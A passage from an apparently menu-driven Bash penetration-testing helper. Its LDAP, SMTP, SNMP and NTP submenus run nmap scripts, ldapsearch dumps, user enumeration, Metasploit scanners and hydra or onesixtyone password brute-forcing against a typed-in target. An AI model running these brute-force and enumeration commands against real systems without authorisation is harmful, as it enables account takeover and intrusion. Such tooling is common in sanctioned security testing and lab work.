                                                unset PASSWORD;;          

                                            0)
                                                clear;
                                                break;; 
                                        esac

                                    done;;   
#show mount
                                11) 
                                                                                
                                    while [[ $IP == "" ]]
                                    do      
                                            printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}\n"               
                                    done        
                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                            printf "${WHITE}Executing command: ${YELLOW}showmount -e ${PURPLE}$IP${YELLOW} \n\n"
                                            echo -e "${NC}-------------------------------------------${NC}"
                                            showmount -e $IP;printf "\n";;
                                    

                                12)
                                    clear;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                    printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                    printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                    printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                    printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                    printf "${WHITE}Share: ${YELLOW}$SHARE${WHITE}\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n";;


                                13)
                                    clear; 
                                    printf "${WHITE}Insert Target IP:\n"${NC}
                                    read -e  IP;printf "\n"
                                    printf "${WHITE}Insert Target Port:\n"${NC}
                                    read -e  PORT;printf "\n"
                                    printf "${WHITE}Insert Domain:\n"${NC}
                                    read -e  DOMAINHOST;printf "\n"                                               
                                    printf "${WHITE}Insert Username:\n"${NC}
                                    read -e  USERNAME;printf "\n" 
                                    printf "${WHITE}Insert Password:\n"${NC}
                                    read -e  PASSWORD;printf "\n"
                                    printf "${WHITE}Insert Share:\n"${NC}
                                    read -e  SHARE;printf "\n"                                   
                                    clear;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                    printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                    printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                    printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                    printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"
                                    printf "${WHITE}Share: ${YELLOW}$SHARE${WHITE}\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n";;

                                14)
                                    clear;
                                    printf "Values Cleared!\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                    unset IP
                                    unset PORT
                                    unset DOMAINHOST
                                    unset PASSWORD
                                    unset USERNAME
                                    unset SHARE;;

                               0)
                                    clear;
                                    break;;

                            esac
                        done;;

#ldap
                    2) 

                        while : ; do

                            printf "${WHITE}Select An Option:${NC}\n\n"
                            echo -e "${CYAN}1. Banner Grab ${NC}" 
                            echo -e "${CYAN}2. LdapSearch ${NC}" 
                            echo -e "${CYAN}3. LdapSearch Naming Context Dum ${NC}" 
                            echo -e "${CYAN}4. LdapSearch Big Dump  ${NC}"
                            echo -e "${CYAN}5. Brute-Force  ${NC}"
                            echo -e "${GREEN}6. Show Values ${NC}"
                            echo -e "${GREEN}7. Set Values ${NC}"
                            echo -e "${GREEN}8. Clear Values ${NC}"
                            echo -e "${YELLOW}0. Back ${NC}\n"
                            echo -n -e "${RED}Enter selection [0-8]: ${NC}"
                            printf ${WHITE};
                            read -e  -r ldapp;
                            printf "\n";clear;

                                case $ldapp in

                                    1)

                                        while [[ $IP == "" ]]
                                        do      
                                            printf "${WHITE}"; printf "Insert Target IP Address:\n"; printf "${NC}";
                                            read -e IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"

                                             printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 389${WHITE})\n";printf "${NC}";
                                            read -e PORT;
                                            printf "${WHITE}Port: ${YELLOW}${PORT}${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                            read -e FLAG;
                                            printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert File Name (optional):\n"; printf "${NC}";
                                            read -e FILENAME;
                                            printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"

                                            echo -e "${NC}-------------------------------------------${NC}\n"                   
                                        done

                                        if [[ $FILENAME != "" ]]
                                        then
                                            OUTPUT_OPTION="-oN /home/$USER/$FOLDER/$FILENAME"
                                        else
                                            OUTPUT_OPTION=""
                                        fi

                                        clear; printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                        printf "${WHITE}Port: ${YELLOW}${PORT:-389}${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -p ${PURPLE}${PORT:-389}${YELLOW} --script ${PURPLE}ldap-search${YELLOW} ${PURPLE}$IP${YELLOW} $OUTPUT_OPTION\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}"
                                        nmap $FLAG -p ${PORT:-389} --script ldap-search $IP $OUTPUT_OPTION; printf "\n";; 


                                    2)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                                        done        
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}ldapsearch -H ldap://${PURPLE}$IP${YELLOW} -x \n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                ldapsearch -H ldap://$IP -x ;printf "\n";;
                                        

                                    3)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                                        done       
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}ldapsearch -H ldap://${PURPLE}$IP${YELLOW} -x -s base namingcontexts \n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                ldapsearch -H ldap://$IP -x -s base namingcontexts ;printf "\n";;
                                        

                                    4)
                                        while [[ $IP == "" || $NAMINGCONTEXT == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert A Naming Context:\n";printf "${NC}";
                                                read -e  NAMINGCONTEXT
                                                printf "${WHITE}Naming Context: ${YELLOW}$NAMINGCONTEXT${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                                        done              
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Naming Context: ${YELLOW}$NAMINGCONTEXT${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}ldapsearch -H ldap://${PURPLE}$IP${YELLOW} -x -b "${PURPLE}$NAMINGCONTEXT${YELLOW}" \n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                ldapsearch -H ldap://$IP -x -b "$NAMINGCONTEXT" ;printf "\n"
                                                unset NAMINGCONTEXT;printf "\n";;

                                    5)

                                        while [[ $IP == "" || $PASSWORDLIST == "" || $USERNAME == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Username:\n";printf "${NC}";
                                                read -e  USERNAME;
                                                printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Passwords List:\n";printf "${NC}";
                                                read -e  PASSWORDLIST;
                                                printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"                                                      
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                
                                          done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n";
                                                printf "${WHITE}Executing command: ${YELLOW}hydra -V -f -l ${PURPLE}$USERNAME${YELLOW} -P ${PURPLE}$PASSWORDLIST${YELLOW} ${PURPLE}$IP${YELLOW} ldap2\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                hydra -V -f -l $USERNAME -P $PASSWORDLIST $IP ldap2;printf "\n";;

                                    6)
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                        printf "${WHITE}Naming Context: ${YELLOW}$NAMINGCONTEXT${WHITE}\n\n"
                                        printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;     
        
                                    7)
                                        clear; 
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;printf "\n"
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;printf "\n"
                                        printf "${WHITE}Insert Username:\n"${NC}
                                        read -e  USERNAME;printf "\n"                                        
                                        printf "${WHITE}Insert Naming Context:\n"${NC}
                                        read -e  NAMINGCONTEXT;printf "\n"
                                        printf "${WHITE}Insert Password List:\n"${NC}
                                        read -e  PASSWORDLIST;printf "\n"

                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                        printf "${WHITE}Naming Context: ${YELLOW}$NAMINGCONTEXT${WHITE}\n\n"
                                        printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;         

                                    8)
                                        clear;
                                        printf "Values Cleared!\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        unset IP
                                        unset PORT
                                        unset USERNAME
                                        unset NAMINGCONTEXT
                                        unset PASSWORDLIST;;

                                    0)
                                        clear;
                                        break;;

                                esac

                        done;;


#smtp
                    3)
                        while : ; do

                            printf "${WHITE}Select An Option:${NC}\n\n"
                            echo -e "${CYAN}1. Banner Grab ${NC}" 
                            echo -e "${CYAN}2. SMTP Vuln Scan ${NC}"  
                            echo -e "${CYAN}3. SMTP User Enum ${NC}"  
                            echo -e "${CYAN}4. SMTPS Connect ${NC}" 
                            echo -e "${CYAN}5. Find MX Servers  ${NC}" 
                            echo -e "${CYAN}6. Brute Force  ${NC}" 
                            echo -e "${CYAN}7. MetaSploit Enum  ${NC}"
                            echo -e "${GREEN}8. Show Values ${NC}"
                            echo -e "${GREEN}9. Set Values ${NC}"
                            echo -e "${GREEN}10. Clear Values ${NC}"
                            echo -e "${YELLOW}0. Back ${NC}\n"
                            echo -n -e "${RED}Enter selection [0-10]: ${NC}"
                            printf ${WHITE};
                            read -e  -r smtpp;
                            printf "\n";clear;

                                case $smtpp in

                                    1)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                                        done       
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}nc -vn ${PURPLE}$IP${YELLOW} 25 \n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                nc -vn $IP 25;printf "\n";;

                                    2)
                                        while [[ $IP == "" ]]
                                        do      
                                            printf "${WHITE}"; printf "Insert Target IP Address:\n"; printf "${NC}";
                                            read -e IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 25${WHITE}):\n"; printf "${NC}";
                                            read -e PORT;
                                            printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                            read -e FLAG;
                                            printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert File Name (optional):\n"; printf "${NC}";
                                            read -e FILENAME;
                                            printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"

                                            echo -e "${NC}-------------------------------------------${NC}\n"

                                        done

                                        if [[ $PORT == "" ]]
                                        then
                                            PORT="25"
                                        fi

                                        clear
                                        printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -p ${PURPLE}$PORT${YELLOW} --script "${PURPLE}snmp* and not snmp-brute${YELLOW}" ${CYAN}$IP${YELLOW}"

                                        if [[ $FILENAME != "" ]]
                                        then
                                            printf " -oN ${CYAN}$FILENAME${YELLOW}\n\n"
                                            nmap $FLAG -p $PORT --script "snmp* and not snmp-brute" $IP -oN $FILENAME
                                        else
                                            printf "\n\n"
                                            nmap $FLAG -p $PORT --script "snmp* and not snmp-brute" $IP
                                        fi

                                        printf "\n"
                                        unset FILENAME;; 


                                    3)
                                        while [[ $IP == "" || $USERLIST == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Users List:\n";printf "${NC}";
                                                read -e  USERLIST;
                                                printf "${WHITE}Users List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"                                                      
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                
                                          done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Users List: ${YELLOW}$USERLIST${WHITE}\n\n";
                                                printf "${WHITE}Executing command: ${YELLOW}smtp-user-enum -M VRFY -U ${PURPLE}$USERLIST${YELLOW} -t ${PURPLE}$IP${YELLOW} \n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                smtp-user-enum -M VRFY -U $USERLIST -t $IP;printf "\n";;

                                    4)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                                        done       
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}openssl s_client -crlf -connect ${PURPLE}$IP:465${YELLOW} && openssl s_client -starttls smtp -crlf -connect ${PURPLE}$IP:587${YELLOW}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                openssl s_client -crlf -connect $IP:465 && openssl s_client -starttls smtp -crlf -connect $IP:587;printf "\n";;

                                    5)
                                        while [[ $DOMAINHOST == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Domain Name:\n";printf "${NC}";
                                                read -e  DOMAINHOST;
                                                printf "${WHITE}Domain Host: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                                        done       
                                                clear;printf "${WHITE}Domain Host: ${YELLOW}$DOMAINHOST\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}dig +short mx ${PURPLE}$DOMAINHOST${YELLOW}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                dig +short mx $DOMAINHOST;printf "\n";;


                                    6)
                                        while [[ $IP == "" || $PASSWORDLIST == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Users List:\n";printf "${NC}";
                                                read -e  USERLIST;
                                                printf "${WHITE}Users List: ${YELLOW}$USERLIST${WHITE}\n\n" 
                                                printf "${WHITE}";printf "Insert Passwords List:\n";printf "${NC}";
                                                read -e  PASSWORDLIST;
                                                printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"                                                      
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                
                                          done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Users List: ${YELLOW}$USERLIST${WHITE}\n\n";printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n";
                                                printf "${WHITE}Executing command: ${YELLOW}hydra -V -L ${PURPLE}$USERLIST${YELLOW} -P ${PURPLE}$PASSWORDLIST${YELLOW} ${PURPLE}$IP${YELLOW} smtp\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                hydra -V -L $USERLIST -P $PASSWORDLIST $IP smtp;printf "\n";;

                                    7)
                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}Executing ${PURPLE}MetaSploit SMTP ${NC}Enumeration\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    msfconsole -q -x "use auxiliary/scanner/smtp/smtp_version; set RHOSTS $IP; set RPORT 25; run; exit" && msfconsole -q -x "use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS $IP; set RPORT 25; run; exit" && msfconsole -q -x "use auxiliary/scanner/smtp/smtp_relay; set RHOSTS $IP; set RPORT 25; run; exit" ; printf "\n";;                                    

                                    8)
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Users List: ${YELLOW}$USERLIST${WHITE}\n\n"
                                        printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;     
        
                                    9)
                                        clear; 
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;printf "\n"
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;printf "\n"
                                        printf "${WHITE}Insert Users List:\n"${NC}
                                        read -e  USERLIST;printf "\n"                                        
                                        printf "${WHITE}Insert Password List:\n"${NC}
                                        read -e  PASSWORDLIST;printf "\n"

                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Users List: ${YELLOW}$USERLIST${WHITE}\n\n"
                                        printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;         

                                    10)
                                        clear;
                                        printf "Values Cleared!\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        unset IP
                                        unset PORT
                                        unset USERLIST
                                        unset PASSWORDLIST;; 

                                    0)
                                        clear;
                                        break;;

                                esac
                            done;;
#snmp
                    4) 

                        while : ; do

                            printf "${WHITE}Select An Option:${NC}\n\n"
                            echo -e "${CYAN}1. SNMP Check ${NC}"
                            echo -e "${CYAN}2. Crack SNMP Passwords ${NC}"  
                            echo -e "${CYAN}3. Nmap Snmp (no brute) ${NC}" 
                            echo -e "${CYAN}4. Brute Force ${NC}"  
                            echo -e "${CYAN}5. MetaSploit Enum  ${NC}"
                            echo -e "${CYAN}6. SNMP Connect  ${NC}"
                            echo -e "${GREEN}7. Show Values ${NC}"
                            echo -e "${GREEN}8. Set Values ${NC}"
                            echo -e "${GREEN}9. Clear Values ${NC}"
                            echo -e "${YELLOW}0. Back ${NC}\n"
                            echo -n -e "${RED}Enter selection [0-8]: ${NC}"
                            printf ${WHITE};
                            read -e  -r snmpp;
                            printf "\n";clear;

                                case $snmpp in

                                     1)
                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}snmp-check ${PURPLE}$IP${YELLOW}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    snmp-check $IP;printf "\n";;

                                    2)
                                        while [[ $IP == "" || $PASSWORDLIST == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Password List (${YELLOW}ex: /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt${WHITE}):\n";printf "${NC}";
                                                read -e  PASSWORDLIST;
                                                printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"                                                      
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                
                                          done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n";
                                                printf "${WHITE}Executing command: ${YELLOW}onesixtyone -c ${PURPLE}$PASSWORDLIST${YELLOW} ${PURPLE}$IP${YELLOW} -w 100\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                onesixtyone -c $PASSWORDLIST $IP -w 100;printf "\n";;

                                    3)
                                        while [[ $IP == "" ]]
                                        do      
                                            printf "${WHITE}"; printf "Insert Target IP Address:\n"; printf "${NC}";
                                            read -e IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 161${WHITE}):\n"; printf "${NC}";
                                            read -e PORT;
                                            printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                            read -e FLAG;
                                            printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert File Name (optional):\n"; printf "${NC}";
                                            read -e FILENAME;
                                            printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"

                                            echo -e "${NC}-------------------------------------------${NC}\n"

                                        done

                                        if [[ $PORT == "" ]]
                                        then
                                            PORT="161,162"
                                        fi

                                        clear
                                        printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -p ${PURPLE}$PORT${YELLOW} --script "${PURPLE}snmp* and not snmp-brute${YELLOW}" ${CYAN}$IP${YELLOW}"

                                        if [[ $FILENAME != "" ]]
                                        then
                                            printf " -oN ${CYAN}$FILENAME${YELLOW}\n\n"
                                            nmap $FLAG -p $PORT --script "snmp* and not snmp-brute" $IP -oN $FILENAME
                                        else
                                            printf "\n\n"
                                            nmap $FLAG -p $PORT --script "snmp* and not snmp-brute" $IP
                                        fi

                                        printf "\n"
                                        unset FILENAME;;

                                    4)
                                        while [[ $IP == "" || $PASSWORDLIST == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Passwords List:\n";printf "${NC}";
                                                read -e  PASSWORDLIST;
                                                printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"                                                      
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n";
                                                printf "${WHITE}Executing command: ${YELLOW}hydra -V -P ${PURPLE}$PASSWORDLIST${YELLOW} ${PURPLE}$IP${YELLOW} snmp\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                hydra -V -P $PASSWORDLIST $IP snmp;printf "\n";;
                                    
                                    5)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing ${PURPLE}MetaSploit SNMP ${NC}Enumeration\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                msfconsole -q -x "use auxiliary/scanner/snmp/snmp_enum; set RHOSTS $IP; set RPORT 161; run; exit"
                                                printf "\n";;

                                    6)
                                      clear;
                                      # Cere introducerea adresei IP, comunității SNMP și OID-ului
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e adresa_ip;
                                        printf "${WHITE}Insert SNMP Community:\n"${NC}
                                        read -e comunitate_snmp;
                                        printf "${WHITE}Insert OID:\n"${NC}
                                        read -e oid;

                                        # Comanda snmpget
                                        snmpget -v2c -c "$comunitate_snmp" "$adresa_ip" "$oid"

                                        # Comanda snmpwalk
                                        snmpwalk -v2c -c "$comunitate_snmp" "$adresa_ip" "$oid";;                


                                    7)
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;     
        
                                    8)
                                        clear; 
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;printf "\n"
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;printf "\n"                                      
                                        printf "${WHITE}Insert Password List:\n"${NC}
                                        read -e  PASSWORDLIST;printf "\n"

                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;         

                                    9)
                                        clear;
                                        printf "Values Cleared!\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        unset IP
                                        unset PORT
                                        unset PASSWORDLIST;; 

                                    0)
                                        clear;
                                        break;;

                                esac
                        done;;

#NTP
                    5)

                        while : ; do

                            printf "${WHITE}Select An Option:${NC}\n\n"
                            echo -e "${CYAN}1. Nmap NTP (not brute) ${NC}"
                            echo -e "${CYAN}2. Readlist ${NC}"  
                            echo -e "${CYAN}3. Readvar(no brute) ${NC}" 
                            echo -e "${CYAN}4. Peers ${NC}"  
                            echo -e "${CYAN}5. Associations ${NC}"
                            echo -e "${CYAN}6. Monlist ${NC}"
                            echo -e "${CYAN}7. Listpeers ${NC}"
                            echo -e "${CYAN}8. Sysinfo ${NC}"
                            echo -e "${GREEN}9. Show Values ${NC}"
                            echo -e "${GREEN}10. Set Values ${NC}"
                            echo -e "${GREEN}11. Clear Values ${NC}"
                            echo -e "${YELLOW}0. Back ${NC}\n"
                            echo -n -e "${RED}Enter selection [0-11]: ${NC}"
                            printf ${WHITE};
                            read -e  -r ntpp;
                            printf "\n";clear;

                                case $ntpp in

                                    1)
                                        while [[ $IP == "" ]]
                                        do      
                                        printf "${WHITE}"; printf "Insert Target IP Address:\n"; printf "${NC}"
                                        read -e IP
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"

                                        printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 123${WHITE}):\n"; printf "${NC}"
                                        read -e PORT
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"

                                        printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}"
                                        read -e FLAG
                                        printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"

                                        printf "${WHITE}"; printf "Insert File Name (optional):\n"; printf "${NC}"
                                        read -e FILENAME
                                        printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"

                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        done 
                                        if [[ $PORT != "" ]]
                                        then
                                            clear
                                            printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                            printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sU -sV -p ${PURPLE}$PORT${YELLOW} --script '${PURPLE}ntp* and (discovery or vuln) and not (dos or brute)${YELLOW}' ${PURPLE}$IP${YELLOW}"
                                            
                                            if [[ $FILENAME != "" ]]
                                            then
                                                printf " -oN ${CYAN}$FILENAME${YELLOW}\n\n"
